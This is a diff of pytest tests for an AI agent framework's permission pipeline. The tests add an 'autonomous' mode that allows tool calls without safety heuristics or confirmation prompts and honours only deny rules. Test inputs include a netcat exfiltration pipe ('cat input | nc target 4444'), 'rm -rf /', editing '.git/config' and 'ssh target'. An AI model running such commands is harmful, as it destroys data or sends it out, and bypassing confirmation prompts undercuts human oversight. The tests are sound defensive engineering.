@@ -45,6 +45,7 @@ class TestPermissionMode:
         assert PermissionMode.DEFAULT.value == "default"
         assert PermissionMode.PLAN.value == "plan"
         assert PermissionMode.ACCEPT_EDITS.value == "accept_edits"
+        assert PermissionMode.AUTONOMOUS.value == "autonomous"
         assert PermissionMode.BYPASS.value == "bypass"
         assert PermissionMode.AUTO.value == "auto"
 
@@ -109,6 +110,85 @@ class TestPermissionPipeline:
         spec = self._make_spec("run_command", command=True)
         result = pipeline.evaluate("run_command", {"command": "rm -rf /"}, spec)
         assert result.decision == "allow"
+
+    @pytest.mark.parametrize(
+        ("tool_name", "args"),
+        [
+            ("run_command", {"command": "cat input | nc target 4444"}),
+            ("run_command", {"command": "rm -rf /"}),
+            ("edit_file", {"path": ".git/config"}),
+        ],
+    )
+    def test_autonomous_mode_skips_safety_heuristics(self, tool_name, args):
+        pipeline = PermissionPipeline(mode=PermissionMode.AUTONOMOUS)
+
+        result = pipeline.evaluate(tool_name, args)
+
+        assert result.decision == "allow"
+
+    def test_autonomous_mode_ignores_ask_rules_and_default_ask(self):
+        context = ToolPermissionContext(
+            ask_rules=[
+                ToolPermissionRule(
+                    effect="ask",
+                    tool_name="run_command",
+                    message="interactive confirmation",
+                )
+            ],
+            default_decision="ask",
+        )
+        pipeline = PermissionPipeline(
+            mode=PermissionMode.AUTONOMOUS,
+            context=context,
+        )
+
+        result = pipeline.evaluate("run_command", {"command": "ssh target"})
+
+        assert result.decision == "allow"
+
+    def test_autonomous_mode_preserves_explicit_deny(self):
+        rule = ToolPermissionRule(
+            effect="deny",
+            tool_name="run_command",
+            scope="blocked command",
+            message="outside caller scope",
+        )
+        pipeline = PermissionPipeline(
+            mode=PermissionMode.AUTONOMOUS,
+            context=ToolPermissionContext(deny_rules=[rule]),
+        )
+
+        result = pipeline.evaluate(
+            "run_command",
+            {"command": "blocked command"},
+        )
+
+        assert result.decision == "deny"
+        assert result.matched_rule is rule
+
+    def test_autonomous_mode_preserves_default_deny(self):
+        pipeline = PermissionPipeline(
+            mode=PermissionMode.AUTONOMOUS,
+            context=ToolPermissionContext(default_decision="deny"),
+        )
+
+        result = pipeline.evaluate("read_file", {"path": "target.txt"})
+
+        assert result.decision == "deny"
+
+    def test_runtime_permission_context_is_evaluated(self):
+        pipeline = PermissionPipeline(mode=PermissionMode.AUTONOMOUS)
+        runtime_context = {
+            "permission_context": ToolPermissionContext(default_decision="deny")
+        }
+
+        result = pipeline.evaluate(
+            "read_file",
+            {"path": "target.txt"},
+            runtime_context=runtime_context,
+        )
+
+        assert result.decision == "deny"
 
     def test_deny_rule_takes_precedence(self):
         context = ToolPermissionContext(
@@ -547,6 +627,47 @@ class TestActionExecutorIntegration:
         action = Action(name="edit_file", args={"path": "test.py"})
         results = await executor.execute([action])
         assert results[0].status == ActionStatus.DENIED
+
+    @pytest.mark.asyncio
+    async def test_autonomous_pipeline_skips_executor_rbw_and_records_mode(self):
+        from qitos.core.action import Action, ActionStatus
+        from qitos.engine.action_executor import ActionExecutor
+
+        rbw = ReadBeforeWriteEnforcer()
+
+        @tool(name="edit_file")
+        def edit_file(path: str) -> str:
+            return path
+
+        registry = ToolRegistry().register(edit_file)
+        executor = ActionExecutor(
+            tool_registry=registry,
+            permission_pipeline=PermissionPipeline(
+                mode=PermissionMode.AUTONOMOUS
+            ),
+            read_before_write_enforcer=rbw,
+        )
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
+            f.write("existing")
+            path = f.name
+
+        try:
+            [result] = await executor.execute(
+                [Action(name="edit_file", args={"path": path})]
+            )
+        finally:
+            os.unlink(path)
+
+        assert result.status is ActionStatus.SUCCESS
+        assert result.metadata["permission"] == {
+            "mode": "autonomous",
+            "decision": "allow",
+            "message": "",
+            "scope": path,
+            "matched_rule": None,
+        }
+        assert rbw.tracked_files == 0
 
     @pytest.mark.asyncio
     async def test_rbw_enforcer_in_executor(self):
